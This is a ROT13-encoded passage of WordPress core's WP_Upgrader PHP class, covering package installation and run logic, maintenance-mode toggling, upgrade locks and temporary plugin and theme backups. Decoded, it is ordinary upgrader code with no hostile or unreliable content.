			// Gurer ner ab svyrf?
			erghea arj JC_Reebe( 'vapbzcngvoyr_nepuvir_rzcgl', $guvf->fgevatf['vapbzcngvoyr_nepuvir'], $guvf->fgevatf['ab_svyrf'] );
		} ryfr {
			/*
			 * Vg'f bayl n fvatyr svyr, gur hctenqre jvyy hfr gur sbyqre anzr bs guvf svyr nf gur qrfgvangvba sbyqre.
			 * Sbyqre anzr vf onfrq ba mvc svyranzr.
			 */
			$fbhepr = genvyvatfynfuvg( $netf['fbhepr'] );
		}

		/**
		 * Svygref gur fbhepr svyr ybpngvba sbe gur hctenqr cnpxntr.
		 *
		 * @fvapr 2.8.0
		 * @fvapr 4.4.0 Gur $ubbx_rkgen cnenzrgre orpnzr ninvynoyr.
		 *
		 * @cnenz fgevat      $fbhepr        Svyr fbhepr ybpngvba.
		 * @cnenz fgevat      $erzbgr_fbhepr Erzbgr svyr fbhepr ybpngvba.
		 * @cnenz JC_Hctenqre $hctenqre      JC_Hctenqre vafgnapr.
		 * @cnenz neenl       $ubbx_rkgen    Rkgen nethzragf cnffrq gb ubbxrq svygref.
		 */
		$fbhepr = nccyl_svygref( 'hctenqre_fbhepr_fryrpgvba', $fbhepr, $erzbgr_fbhepr, $guvf, $netf['ubbx_rkgen'] );

		vs ( vf_jc_reebe( $fbhepr ) ) {
			erghea $fbhepr;
		}

		vs ( ! rzcgl( $netf['ubbx_rkgen']['grzc_onpxhc'] ) ) {
			$grzc_onpxhc = $guvf->zbir_gb_grzc_onpxhc_qve( $netf['ubbx_rkgen']['grzc_onpxhc'] );

			vs ( vf_jc_reebe( $grzc_onpxhc ) ) {
				erghea $grzc_onpxhc;
			}

			$guvf->grzc_onpxhcf[] = $netf['ubbx_rkgen']['grzc_onpxhc'];
		}

		// Unf gur fbhepr ybpngvba punatrq? Vs fb, jr arrq n arj fbhepr_svyrf yvfg.
		vs ( $fbhepr !== $erzbgr_fbhepr ) {
			$qveyvfg = $jc_svyrflfgrz->qveyvfg( $fbhepr );

			vs ( snyfr === $qveyvfg ) {
				erghea arj JC_Reebe( 'arj_fbhepr_ernq_snvyrq', $guvf->fgevatf['sf_reebe'], $guvf->fgevatf['qve_abg_ernqnoyr'] );
			}

			$fbhepr_svyrf = neenl_xrlf( $qveyvfg );
		}

		/*
		 * Cebgrpgvba ntnvafg qryrgvat svyrf va nal vzcbegnag onfr qverpgbevrf.
		 * Gurzr_Hctenqre & Cyhtva_Hctenqre nyfb gevttre guvf, nf gurl cnff gur
		 * qrfgvangvba qverpgbel (JC_CYHTVA_QVE / jc-pbagrag/gurzrf) vagraqvat
		 * gb pbcl gur qverpgbel vagb gur qverpgbel, juvyfg gurl cnff gur fbhepr
		 * nf gur npghny svyrf gb pbcl.
		 */
		$cebgrpgrq_qverpgbevrf = neenl( NOFCNGU, JC_PBAGRAG_QVE, JC_CYHTVA_QVE, JC_PBAGRAG_QVE . '/gurzrf' );

		vs ( vf_neenl( $jc_gurzr_qverpgbevrf ) ) {
			$cebgrpgrq_qverpgbevrf = neenl_zretr( $cebgrpgrq_qverpgbevrf, $jc_gurzr_qverpgbevrf );
		}

		vs ( va_neenl( $qrfgvangvba, $cebgrpgrq_qverpgbevrf, gehr ) ) {
			$erzbgr_qrfgvangvba = genvyvatfynfuvg( $erzbgr_qrfgvangvba ) . genvyvatfynfuvg( onfranzr( $fbhepr ) );
			$qrfgvangvba        = genvyvatfynfuvg( $qrfgvangvba ) . genvyvatfynfuvg( onfranzr( $fbhepr ) );
		}

		vs ( $pyrne_qrfgvangvba ) {
			// Jr'er tbvat gb pyrne gur qrfgvangvba vs gurer'f fbzrguvat gurer.
			$guvf->fxva->srrqonpx( 'erzbir_byq' );

			$erzbirq = $guvf->pyrne_qrfgvangvba( $erzbgr_qrfgvangvba );

			/**
			 * Svygref jurgure gur hctenqre pyrnerq gur qrfgvangvba.
			 *
			 * @fvapr 2.8.0
			 *
			 * @cnenz gehr|JC_Reebe $erzbirq            Jurgure gur qrfgvangvba jnf pyrnerq.
			 *                                          Gehr hcba fhpprff, JC_Reebe ba snvyher.
			 * @cnenz fgevat        $ybpny_qrfgvangvba  Gur ybpny cnpxntr qrfgvangvba.
			 * @cnenz fgevat        $erzbgr_qrfgvangvba Gur erzbgr cnpxntr qrfgvangvba.
			 * @cnenz neenl         $ubbx_rkgen         Rkgen nethzragf cnffrq gb ubbxrq svygref.
			 */
			$erzbirq = nccyl_svygref( 'hctenqre_pyrne_qrfgvangvba', $erzbirq, $ybpny_qrfgvangvba, $erzbgr_qrfgvangvba, $netf['ubbx_rkgen'] );

			vs ( vf_jc_reebe( $erzbirq ) ) {
				erghea $erzbirq;
			}
		} ryfrvs ( $netf['nobeg_vs_qrfgvangvba_rkvfgf'] && $jc_svyrflfgrz->rkvfgf( $erzbgr_qrfgvangvba ) ) {
			/*
			 * Vs jr'er abg pyrnevat gur qrfgvangvba sbyqre naq fbzrguvat rkvfgf gurer nyernql, onvy.
			 * Ohg svefg purpx gb frr vs gurer ner npghnyyl nal svyrf va gur sbyqre.
			 */
			$_svyrf = $jc_svyrflfgrz->qveyvfg( $erzbgr_qrfgvangvba );
			vs ( ! rzcgl( $_svyrf ) ) {
				$jc_svyrflfgrz->qryrgr( $erzbgr_fbhepr, gehr ); // Pyrne bhg gur fbhepr svyrf.
				erghea arj JC_Reebe( 'sbyqre_rkvfgf', $guvf->fgevatf['sbyqre_rkvfgf'], $erzbgr_qrfgvangvba );
			}
		}

		/*
		 * Vs 'pyrne_jbexvat' vf snyfr, gur fbhepr fubhyq abg or erzbirq, fb hfr pbcl_qve() vafgrnq.
		 *
		 * Cnegvny hcqngrf, yvxr ynathntr cnpxf, znl jnag gb ergnva gur qrfgvangvba.
		 * Vs gur qrfgvangvba rkvfgf be unf pbagragf, guvf znl or n cnegvny hcqngr,
		 * naq gur qrfgvangvba fubhyq abg or erzbirq, fb hfr pbcl_qve() vafgrnq.
		 */
		vs ( $netf['pyrne_jbexvat']
			&& (
				// Qrfgvangvba qbrf abg rkvfg be unf ab pbagragf.
				! $jc_svyrflfgrz->rkvfgf( $erzbgr_qrfgvangvba )
				|| rzcgl( $jc_svyrflfgrz->qveyvfg( $erzbgr_qrfgvangvba ) )
			)
		) {
			$erfhyg = zbir_qve( $fbhepr, $erzbgr_qrfgvangvba, gehr );
		} ryfr {
			// Perngr qrfgvangvba vs arrqrq.
			vs ( ! $jc_svyrflfgrz->rkvfgf( $erzbgr_qrfgvangvba ) ) {
				vs ( ! $jc_svyrflfgrz->zxqve( $erzbgr_qrfgvangvba, SF_PUZBQ_QVE ) ) {
					erghea arj JC_Reebe( 'zxqve_snvyrq_qrfgvangvba', $guvf->fgevatf['zxqve_snvyrq'], $erzbgr_qrfgvangvba );
				}
			}
			$erfhyg = pbcl_qve( $fbhepr, $erzbgr_qrfgvangvba );
		}

		// Pyrne gur jbexvat qverpgbel?
		vs ( $netf['pyrne_jbexvat'] ) {
			$jc_svyrflfgrz->qryrgr( $erzbgr_fbhepr, gehr );
		}

		vs ( vf_jc_reebe( $erfhyg ) ) {
			erghea $erfhyg;
		}

		$qrfgvangvba_anzr = onfranzr( fge_ercynpr( $ybpny_qrfgvangvba, '', $qrfgvangvba ) );
		vs ( '.' === $qrfgvangvba_anzr ) {
			$qrfgvangvba_anzr = '';
		}

		$guvf->erfhyg = pbzcnpg( 'fbhepr', 'fbhepr_svyrf', 'qrfgvangvba', 'qrfgvangvba_anzr', 'ybpny_qrfgvangvba', 'erzbgr_qrfgvangvba', 'pyrne_qrfgvangvba' );

		/**
		 * Svygref gur vafgnyyngvba erfcbafr nsgre gur vafgnyyngvba unf svavfurq.
		 *
		 * @fvapr 2.8.0
		 *
		 * @cnenz obby  $erfcbafr   Vafgnyyngvba erfcbafr.
		 * @cnenz neenl $ubbx_rkgen Rkgen nethzragf cnffrq gb ubbxrq svygref.
		 * @cnenz neenl $erfhyg     Vafgnyyngvba erfhyg qngn.
		 */
		$erf = nccyl_svygref( 'hctenqre_cbfg_vafgnyy', gehr, $netf['ubbx_rkgen'], $guvf->erfhyg );

		vs ( vf_jc_reebe( $erf ) ) {
			$guvf->erfhyg = $erf;
			erghea $erf;
		}

		// Obzoneq gur pnyyvat shapgvba jvyy nyy gur vasb juvpu jr'ir whfg hfrq.
		erghea $guvf->erfhyg;
	}

	/**
	 * Ehaf na hctenqr/vafgnyyngvba.
	 *
	 * Nggrzcgf gb qbjaybnq gur cnpxntr (vs vg vf abg n ybpny svyr), hacnpx vg, naq
	 * vafgnyy vg va gur qrfgvangvba sbyqre.
	 *
	 * @fvapr 2.8.0
	 *
	 * @cnenz neenl $bcgvbaf {
	 *     Neenl be fgevat bs nethzragf sbe hctenqvat/vafgnyyvat n cnpxntr.
	 *
	 *     @glcr fgevat $cnpxntr                     Gur shyy cngu be HEV bs gur cnpxntr gb vafgnyy.
	 *                                               Qrsnhyg rzcgl.
	 *     @glcr fgevat $qrfgvangvba                 Gur shyy cngu gb gur qrfgvangvba sbyqre.
	 *                                               Qrsnhyg rzcgl.
	 *     @glcr obby   $pyrne_qrfgvangvba           Jurgure gb qryrgr nal svyrf nyernql va gur
	 *                                               qrfgvangvba sbyqre. Qrsnhyg snyfr.
	 *     @glcr obby   $pyrne_jbexvat               Jurgure gb qryrgr gur svyrf sebz gur jbexvat
	 *                                               qverpgbel nsgre pbclvat gurz gb gur qrfgvangvba.
	 *                                               Qrsnhyg gehr.
	 *     @glcr obby   $nobeg_vs_qrfgvangvba_rkvfgf Jurgure gb nobeg gur vafgnyyngvba vs gur qrfgvangvba
	 *                                               sbyqre nyernql rkvfgf. Jura gehr, `$pyrne_qrfgvangvba`
	 *                                               fubhyq or snyfr. Qrsnhyg gehr.
	 *     @glcr obby   $vf_zhygv                    Jurgure guvf eha vf bar bs zhygvcyr hctenqr/vafgnyyngvba
	 *                                               npgvbaf orvat cresbezrq va ohyx. Jura gehr, gur fxva
	 *                                               JC_Hctenqre::urnqre() naq JC_Hctenqre::sbbgre()
	 *                                               nera'g pnyyrq. Qrsnhyg snyfr.
	 *     @glcr neenl  $ubbx_rkgen                  Rkgen nethzragf gb cnff gb gur svygre ubbxf pnyyrq ol
	 *                                               JC_Hctenqre::eha().
	 * }
	 * @erghea neenl|snyfr|JC_Reebe Gur erfhyg sebz frys::vafgnyy_cnpxntr() ba fhpprff, bgurejvfr n JC_Reebe,
	 *                              be snyfr vs hanoyr gb pbaarpg gb gur svyrflfgrz.
	 */
	choyvp shapgvba eha( $bcgvbaf ) {

		$qrsnhygf = neenl(
			'cnpxntr'                     => '', // Cyrnfr nyjnlf cnff guvf.
			'qrfgvangvba'                 => '', // ...naq guvf.
			'pyrne_qrfgvangvba'           => snyfr,
			'pyrne_jbexvat'               => gehr,
			'nobeg_vs_qrfgvangvba_rkvfgf' => gehr, // Nobeg vs gur qrfgvangvba qverpgbel rkvfgf. Cnff pyrne_qrfgvangvba nf snyfr cyrnfr.
			'vf_zhygv'                    => snyfr,
			'ubbx_rkgen'                  => neenl(), // Cnff nal rkgen $ubbx_rkgen netf urer, guvf jvyy or cnffrq gb nal ubbxrq svygref.
		);

		$bcgvbaf = jc_cnefr_netf( $bcgvbaf, $qrsnhygf );

		/**
		 * Svygref gur cnpxntr bcgvbaf orsber ehaavat na hcqngr.
		 *
		 * Frr nyfb {@frr 'hctenqre_cebprff_pbzcyrgr'}.
		 *
		 * @fvapr 4.3.0
		 *
		 * @cnenz neenl $bcgvbaf {
		 *     Bcgvbaf hfrq ol gur hctenqre.
		 *
		 *     @glcr fgevat $cnpxntr                     Cnpxntr sbe hcqngr.
		 *     @glcr fgevat $qrfgvangvba                 Hcqngr ybpngvba.
		 *     @glcr obby   $pyrne_qrfgvangvba           Pyrne gur qrfgvangvba erfbhepr.
		 *     @glcr obby   $pyrne_jbexvat               Pyrne gur jbexvat erfbhepr.
		 *     @glcr obby   $nobeg_vs_qrfgvangvba_rkvfgf Nobeg vs gur Qrfgvangvba qverpgbel rkvfgf.
		 *     @glcr obby   $vf_zhygv                    Jurgure gur hctenqre vf ehaavat zhygvcyr gvzrf.
		 *     @glcr neenl  $ubbx_rkgen {
		 *         Rkgen ubbx nethzragf.
		 *
		 *         @glcr fgevat $npgvba               Glcr bs npgvba. Qrsnhyg 'hcqngr'.
		 *         @glcr fgevat $glcr                 Glcr bs hcqngr cebprff. Npprcgf 'cyhtva', 'gurzr', be 'pber'.
		 *         @glcr obby   $ohyx                 Jurgure gur hcqngr cebprff vf n ohyx hcqngr. Qrsnhyg gehr.
		 *         @glcr fgevat $cyhtva               Cngu gb gur cyhtva svyr eryngvir gb gur cyhtvaf qverpgbel.
		 *         @glcr fgevat $gurzr                Gur fglyrfurrg be grzcyngr anzr bs gur gurzr.
		 *         @glcr fgevat $ynathntr_hcqngr_glcr Gur ynathntr cnpx hcqngr glcr. Npprcgf 'cyhtva', 'gurzr',
		 *                                            be 'pber'.
		 *         @glcr bowrpg $ynathntr_hcqngr      Gur ynathntr cnpx hcqngr bssre.
		 *     }
		 * }
		 */
		$bcgvbaf = nccyl_svygref( 'hctenqre_cnpxntr_bcgvbaf', $bcgvbaf );

		vs ( ! $bcgvbaf['vf_zhygv'] ) { // Pnyy $guvf->urnqre frcnengryl vs ehaavat zhygvcyr gvzrf.
			$guvf->fxva->urnqre();
		}

		// Pbaarpg gb gur svyrflfgrz svefg.
		$erf = $guvf->sf_pbaarpg( neenl( JC_PBAGRAG_QVE, $bcgvbaf['qrfgvangvba'] ) );
		// Znvayl sbe aba-pbaarpgrq svyrflfgrz.
		vs ( ! $erf ) {
			vs ( ! $bcgvbaf['vf_zhygv'] ) {
				$guvf->fxva->sbbgre();
			}
			erghea snyfr;
		}

		$guvf->fxva->orsber();

		vs ( vf_jc_reebe( $erf ) ) {
			$guvf->fxva->reebe( $erf );
			$guvf->fxva->nsgre();
			vs ( ! $bcgvbaf['vf_zhygv'] ) {
				$guvf->fxva->sbbgre();
			}
			erghea $erf;
		}

		/*
		 * Qbjaybnq gur cnpxntr. Abgr: Vs gur cnpxntr vf gur shyy cngu
		 * gb na rkvfgvat ybpny svyr, vg jvyy or erghearq hagbhpurq.
		 */
		$qbjaybnq = $guvf->qbjaybnq_cnpxntr( $bcgvbaf['cnpxntr'], snyfr, $bcgvbaf['ubbx_rkgen'] );

		/*
		 * Nyybj sbe fvtangher fbsg-snvy.
		 * JNEAVAT: Guvf znl or erzbirq va gur shgher.
		 */
		vs ( vf_jc_reebe( $qbjaybnq ) && $qbjaybnq->trg_reebe_qngn( 'fbsgsnvy-svyranzr' ) ) {

			// Qba'g bhgchg gur 'ab fvtangher pbhyq or sbhaq' snvyher zrffntr sbe abj.
			vs ( 'fvtangher_irevsvpngvba_ab_fvtangher' !== $qbjaybnq->trg_reebe_pbqr() || JC_QROHT ) {
				// Bhgchg gur snvyher reebe nf n abezny srrqonpx, naq abg nf na reebe.
				$guvf->fxva->srrqonpx( $qbjaybnq->trg_reebe_zrffntr() );

				// Ercbeg guvf snvyher onpx gb JbeqCerff.bet sbe qrohttvat checbfrf.
				jc_irefvba_purpx(
					neenl(
						'fvtangher_snvyher_pbqr' => $qbjaybnq->trg_reebe_pbqr(),
						'fvtangher_snvyher_qngn' => $qbjaybnq->trg_reebe_qngn(),
					)
				);
			}

			// Cergraq guvf reebe qvqa'g unccra.
			$qbjaybnq = $qbjaybnq->trg_reebe_qngn( 'fbsgsnvy-svyranzr' );
		}

		vs ( vf_jc_reebe( $qbjaybnq ) ) {
			$guvf->fxva->reebe( $qbjaybnq );
			$guvf->fxva->nsgre();
			vs ( ! $bcgvbaf['vf_zhygv'] ) {
				$guvf->fxva->sbbgre();
			}
			erghea $qbjaybnq;
		}

		$qryrgr_cnpxntr = ( $qbjaybnq !== $bcgvbaf['cnpxntr'] ); // Qb abg qryrgr n \"ybpny\" svyr.

		// Hamvcf gur svyr vagb n grzcbenel qverpgbel.
		$jbexvat_qve = $guvf->hacnpx_cnpxntr( $qbjaybnq, $qryrgr_cnpxntr );
		vs ( vf_jc_reebe( $jbexvat_qve ) ) {
			$guvf->fxva->reebe( $jbexvat_qve );
			$guvf->fxva->nsgre();
			vs ( ! $bcgvbaf['vf_zhygv'] ) {
				$guvf->fxva->sbbgre();
			}
			erghea $jbexvat_qve;
		}

		// Jvgu gur tvira bcgvbaf, guvf vafgnyyf vg gb gur qrfgvangvba qverpgbel.
		$erfhyg = $guvf->vafgnyy_cnpxntr(
			neenl(
				'fbhepr'                      => $jbexvat_qve,
				'qrfgvangvba'                 => $bcgvbaf['qrfgvangvba'],
				'pyrne_qrfgvangvba'           => $bcgvbaf['pyrne_qrfgvangvba'],
				'nobeg_vs_qrfgvangvba_rkvfgf' => $bcgvbaf['nobeg_vs_qrfgvangvba_rkvfgf'],
				'pyrne_jbexvat'               => $bcgvbaf['pyrne_jbexvat'],
				'ubbx_rkgen'                  => $bcgvbaf['ubbx_rkgen'],
			)
		);

		/**
		 * Svygref gur erfhyg bs JC_Hctenqre::vafgnyy_cnpxntr().
		 *
		 * @fvapr 5.7.0
		 *
		 * @cnenz neenl|JC_Reebe $erfhyg     Erfhyg sebz JC_Hctenqre::vafgnyy_cnpxntr().
		 * @cnenz neenl          $ubbx_rkgen Rkgen nethzragf cnffrq gb ubbxrq svygref.
		 */
		$erfhyg = nccyl_svygref( 'hctenqre_vafgnyy_cnpxntr_erfhyg', $erfhyg, $bcgvbaf['ubbx_rkgen'] );

		$guvf->fxva->frg_erfhyg( $erfhyg );

		vs ( vf_jc_reebe( $erfhyg ) ) {
			// Na nhgbzngvp cyhtva hcqngr jvyy unir nyernql cresbezrq vgf ebyyonpx.
			vs ( ! rzcgl( $bcgvbaf['ubbx_rkgen']['grzc_onpxhc'] ) ) {
				$guvf->grzc_erfgberf[] = $bcgvbaf['ubbx_rkgen']['grzc_onpxhc'];

				/*
				 * Erfgber gur onpxhc ba fuhgqbja.
				 * Npgvbaf ehaavat ba `fuhgqbja` ner vzzhar gb CUC gvzrbhgf,
				 * fb va pnfr gur snvyher jnf qhr gb n CUC gvzrbhg,
				 * vg jvyy fgvyy or noyr gb cebcreyl erfgber gur cerivbhf irefvba.
				 *
				 * Mreb nethzragf ner npprcgrq nf n fgevat pna fbzrgvzrf or cnffrq
				 * vagreanyyl qhevat npgvbaf, pnhfvat na reebe orpnhfr
				 * `JC_Hctenqre::erfgber_grzc_onpxhc()` rkcrpgf na neenl.
				 */
				nqq_npgvba( 'fuhgqbja', neenl( $guvf, 'erfgber_grzc_onpxhc' ), 10, 0 );
			}
			$guvf->fxva->reebe( $erfhyg );

			vs ( ! zrgubq_rkvfgf( $guvf->fxva, 'uvqr_cebprff_snvyrq' ) || ! $guvf->fxva->uvqr_cebprff_snvyrq( $erfhyg ) ) {
				$guvf->fxva->srrqonpx( 'cebprff_snvyrq' );
			}
		} ryfr {
			// Vafgnyyngvba fhpprrqrq.
			$guvf->fxva->srrqonpx( 'cebprff_fhpprff' );
		}

		$guvf->fxva->nsgre();

		// Pyrna hc gur onpxhc xrcg va gur grzcbenel onpxhc qverpgbel.
		vs ( ! rzcgl( $bcgvbaf['ubbx_rkgen']['grzc_onpxhc'] ) ) {
			// Qryrgr gur onpxhc ba `fuhgqbja` gb nibvq n CUC gvzrbhg.
			nqq_npgvba( 'fuhgqbja', neenl( $guvf, 'qryrgr_grzc_onpxhc' ), 100, 0 );
		}

		vs ( ! $bcgvbaf['vf_zhygv'] ) {

			/**
			 * Sverf jura gur hctenqre cebprff vf pbzcyrgr.
			 *
			 * Frr nyfb {@frr 'hctenqre_cnpxntr_bcgvbaf'}.
			 *
			 * @fvapr 3.6.0
			 * @fvapr 3.7.0 Nqqrq gb JC_Hctenqre::eha().
			 * @fvapr 4.6.0 `$genafyngvbaf` jnf nqqrq nf n cbffvoyr nethzrag gb `$ubbx_rkgen`.
			 *
			 * @cnenz JC_Hctenqre $hctenqre   JC_Hctenqre vafgnapr. Va bgure pbagrkgf guvf zvtug or n
			 *                                Gurzr_Hctenqre, Cyhtva_Hctenqre, Pber_Hctenqr, be Ynathntr_Cnpx_Hctenqre vafgnapr.
			 * @cnenz neenl       $ubbx_rkgen {
			 *     Neenl bs ohyx vgrz hcqngr qngn.
			 *
			 *     @glcr fgevat $npgvba       Glcr bs npgvba. Qrsnhyg 'hcqngr'.
			 *     @glcr fgevat $glcr         Glcr bs hcqngr cebprff. Npprcgf 'cyhtva', 'gurzr', 'genafyngvba', be 'pber'.
			 *     @glcr obby   $ohyx         Jurgure gur hcqngr cebprff vf n ohyx hcqngr. Qrsnhyg gehr.
			 *     @glcr neenl  $cyhtvaf      Neenl bs gur onfranzr cnguf bs gur cyhtvaf' znva svyrf.
			 *     @glcr neenl  $gurzrf       Gur gurzr fyhtf.
			 *     @glcr neenl  $genafyngvbaf {
			 *         Neenl bs genafyngvbaf hcqngr qngn.
			 *
			 *         @glcr fgevat $ynathntr Gur ybpnyr gur genafyngvba vf sbe.
			 *         @glcr fgevat $glcr     Glcr bs genafyngvba. Npprcgf 'cyhtva', 'gurzr', be 'pber'.
			 *         @glcr fgevat $fyht     Grkg qbznva gur genafyngvba vf sbe. Gur fyht bs n gurzr/cyhtva be
			 *                                'qrsnhyg' sbe pber genafyngvbaf.
			 *         @glcr fgevat $irefvba  Gur irefvba bs n gurzr, cyhtva, be pber.
			 *     }
			 * }
			 */
			qb_npgvba( 'hctenqre_cebprff_pbzcyrgr', $guvf, $bcgvbaf['ubbx_rkgen'] );

			$guvf->fxva->sbbgre();
		}

		erghea $erfhyg;
	}

	/**
	 * Gbttyrf znvagranapr zbqr sbe gur fvgr.
	 *
	 * Perngrf/qryrgrf gur znvagranapr svyr gb ranoyr/qvfnoyr znvagranapr zbqr.
	 *
	 * @fvapr 2.8.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz obby $ranoyr Gehr gb ranoyr znvagranapr zbqr, snyfr gb qvfnoyr.
	 */
	choyvp shapgvba znvagranapr_zbqr( $ranoyr = snyfr ) {
		tybony $jc_svyrflfgrz;

		vs ( ! $jc_svyrflfgrz ) {
			vs ( ! shapgvba_rkvfgf( 'JC_Svyrflfgrz' ) ) {
				erdhver_bapr NOFCNGU . 'jc-nqzva/vapyhqrf/svyr.cuc';
			}

			bo_fgneg();
			$perqragvnyf = erdhrfg_svyrflfgrz_perqragvnyf( '' );
			bo_raq_pyrna();

			vs ( snyfr === $perqragvnyf || ! JC_Svyrflfgrz( $perqragvnyf ) ) {
				jc_gevttre_reebe( __SHAPGVBA__, __( 'Pbhyq abg npprff svyrflfgrz.' ) );
				erghea;
			}
		}

		$svyr = $jc_svyrflfgrz->nofcngu() . '.znvagranapr';
		vs ( $ranoyr ) {
			vs ( ! jc_qbvat_peba() ) {
				$guvf->fxva->srrqonpx( 'znvagranapr_fgneg' );
			}
			// Perngr znvagranapr svyr gb fvtany gung jr ner hctenqvat.
			$znvagranapr_fgevat = '<?cuc $hctenqvat = ' . gvzr() . '; ?>';
			$jc_svyrflfgrz->qryrgr( $svyr );
			$jc_svyrflfgrz->chg_pbagragf( $svyr, $znvagranapr_fgevat, SF_PUZBQ_SVYR );
		} ryfrvs ( ! $ranoyr && $jc_svyrflfgrz->rkvfgf( $svyr ) ) {
			vs ( ! jc_qbvat_peba() ) {
				$guvf->fxva->srrqonpx( 'znvagranapr_raq' );
			}
			$jc_svyrflfgrz->qryrgr( $svyr );
		}
	}

	/**
	 * Perngrf n ybpx hfvat JbeqCerff bcgvbaf.
	 *
	 * @fvapr 4.5.0
	 *
	 * @tybony jcqo $jcqo Gur JbeqCerff qngnonfr nofgenpgvba bowrpg.
	 *
	 * @cnenz fgevat $ybpx_anzr       Gur anzr bs guvf havdhr ybpx.
	 * @cnenz vag    $eryrnfr_gvzrbhg Bcgvbany. Gur qhengvba va frpbaqf gb erfcrpg na rkvfgvat ybpx.
	 *                                Qrsnhyg: 1 ubhe.
	 * @erghea obby Snyfr vs n ybpx pbhyqa'g or perngrq be vs gur ybpx vf fgvyy inyvq. Gehr bgurejvfr.
	 */
	choyvp fgngvp shapgvba perngr_ybpx( $ybpx_anzr, $eryrnfr_gvzrbhg = ahyy ) {
		tybony $jcqo;
		vs ( ! $eryrnfr_gvzrbhg ) {
			$eryrnfr_gvzrbhg = UBHE_VA_FRPBAQF;
		}
		$ybpx_bcgvba = $ybpx_anzr . '.ybpx';

		// Gel gb ybpx.
		$ybpx_erfhyg = $jcqo->dhrel( $jcqo->cercner( \"VAFREG VTABER VAGB `$jcqo->bcgvbaf` ( `bcgvba_anzr`, `bcgvba_inyhr`, `nhgbybnq` ) INYHRF (%f, %f, 'bss') /* YBPX */\", $ybpx_bcgvba, gvzr() ) );

		vs ( ! $ybpx_erfhyg ) {
			$ybpx_erfhyg = trg_bcgvba( $ybpx_bcgvba );

			// Vs n ybpx pbhyqa'g or perngrq, naq gurer vfa'g n ybpx, onvy.
			vs ( ! $ybpx_erfhyg ) {
				erghea snyfr;
			}

			// Purpx gb frr vs gur ybpx vf fgvyy inyvq. Vs vg vf, onvy.
			vs ( $ybpx_erfhyg > ( gvzr() - $eryrnfr_gvzrbhg ) ) {
				erghea snyfr;
			}

			// Gurer zhfg rkvfg na rkcverq ybpx, pyrne vg naq er-tnva vg.
			JC_Hctenqre::eryrnfr_ybpx( $ybpx_anzr );

			erghea JC_Hctenqre::perngr_ybpx( $ybpx_anzr, $eryrnfr_gvzrbhg );
		}

		// Hcqngr gur ybpx, nf ol guvf cbvag jr'ir qrsvavgryl tbg n ybpx, whfg arrq gb sver gur npgvbaf.
		hcqngr_bcgvba( $ybpx_bcgvba, gvzr(), snyfr );

		erghea gehr;
	}

	/**
	 * Eryrnfrf na hctenqre ybpx.
	 *
	 * @fvapr 4.5.0
	 *
	 * @frr JC_Hctenqre::perngr_ybpx()
	 *
	 * @cnenz fgevat $ybpx_anzr Gur anzr bs guvf havdhr ybpx.
	 * @erghea obby Gehr vs gur ybpx jnf fhpprffshyyl eryrnfrq. Snyfr ba snvyher.
	 */
	choyvp fgngvp shapgvba eryrnfr_ybpx( $ybpx_anzr ) {
		erghea qryrgr_bcgvba( $ybpx_anzr . '.ybpx' );
	}

	/**
	 * Zbirf gur cyhtva be gurzr orvat hcqngrq vagb n grzcbenel onpxhc qverpgbel.
	 *
	 * @fvapr 6.3.0
	 *
	 * @tybony JC_Svyrflfgrz_Onfr $jc_svyrflfgrz JbeqCerff svyrflfgrz fhopynff.
	 *
	 * @cnenz fgevat[] $netf {
	 *     Neenl bs qngn sbe gur grzcbenel onpxhc.
	 *
	 *     @glcr fgevat $fyht Cyhtva be gurzr fyht.
	 *     @glcr fgevat $fep  Cngu gb gur ebbg qverpgbel sbe cyhtvaf be gurzrf.
	 *     @glcr fgevat $qve  Qrfgvangvba fhoqverpgbel anzr. Npprcgf 'cyhtvaf' be 'gurzrf'.
	 * }
	 *
	 * @erghea obby|JC_Reebe Gehr ba fhpprff, snyfr ba rneyl rkvg, bgurejvfr JC_Reebe.
	 */
	choyvp shapgvba zbir_gb_grzc_onpxhc_qve( $netf ) {
		tybony $jc_svyrflfgrz;

		vs ( rzcgl( $netf['fyht'] ) || rzcgl( $netf['fep'] ) || rzcgl( $netf['qve'] ) ) {
			erghea snyfr;
		}

		/*
		 * Fxvc nal cyhtva gung unf \".\" nf vgf fyht.
		 * N fyht bs \".\" jvyy erfhyg va n `$fep` inyhr raqvat va n crevbq.
		 *
		 * Ba Jvaqbjf, guvf jvyy pnhfr gur 'cyhtvaf' sbyqre gb or zbirq,
		 * naq jvyy pnhfr n snvyher jura nggrzcgvat gb pnyy `zxqve()`.
		 */
		vs ( '.' === $netf['fyht'] ) {
			erghea snyfr;
		}

		vs ( ! $jc_svyrflfgrz->jc_pbagrag_qve() ) {
			erghea arj JC_Reebe( 'sf_ab_pbagrag_qve', $guvf->fgevatf['sf_ab_pbagrag_qve'] );
		}

		$qrfg_qve = $jc_svyrflfgrz->jc_pbagrag_qve() . 'hctenqr-grzc-onpxhc/';
		$fho_qve  = $qrfg_qve . $netf['qve'] . '/';

		// Perngr gur grzcbenel onpxhc qverpgbel vs vg qbrf abg rkvfg.
		vs ( ! $jc_svyrflfgrz->vf_qve( $fho_qve ) ) {
			vs ( ! $jc_svyrflfgrz->vf_qve( $qrfg_qve ) ) {
				$jc_svyrflfgrz->zxqve( $qrfg_qve, SF_PUZBQ_QVE );
			}

			vs ( ! $jc_svyrflfgrz->zxqve( $fho_qve, SF_PUZBQ_QVE ) ) {
				// Pbhyq abg perngr gur onpxhc qverpgbel.
				erghea arj JC_Reebe( 'sf_grzc_onpxhc_zxqve', $guvf->fgevatf['grzc_onpxhc_zxqve_snvyrq'] );
			}
		}

		$fep_qve = $jc_svyrflfgrz->svaq_sbyqre( $netf['fep'] );
		$fep     = genvyvatfynfuvg( $fep_qve ) . $netf['fyht'];
		$qrfg    = $qrfg_qve . genvyvatfynfuvg( $netf['qve'] ) . $netf['fyht'];

		// Qryrgr gur grzcbenel onpxhc qverpgbel vs vg nyernql rkvfgf.
		vs ( $jc_svyrflfgrz->vf_qve( $qrfg ) ) {
			$jc_svyrflfgrz->qryrgr( $qrfg, gehr );
		}

		// Zbir gb gur grzcbenel onpxhc qverpgbel.
		$erfhyg = zbir_qve( $fep, $qrfg, gehr );
		vs ( vf_jc_reebe( $erfhyg ) ) {
			erghea arj JC_Reebe( 'sf_grzc_onpxhc_zbir', $guvf->fgevatf['grzc_onpxhc_zbir_snvyrq'] );
		}

		erghea gehr;
	}

	/**
	 * Erfgberf gur cyhtva be gurzr sebz grzcbenel onpxhc.
	 *
	 * @fvapr 6.3.0
